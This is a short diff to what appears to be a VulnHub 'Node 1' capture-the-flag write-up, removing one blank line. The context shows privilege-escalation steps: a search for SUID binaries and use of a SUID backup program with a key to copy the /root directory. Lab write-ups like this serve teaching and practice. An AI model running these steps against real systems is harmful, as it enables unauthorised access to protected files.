@@ -169,7 +169,6 @@ mark
 find / -type f -perm -04000 2>/dev/null
 /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root
 /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp/test/
-
 ```
 
 ![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_node1/screenshot17.png)  
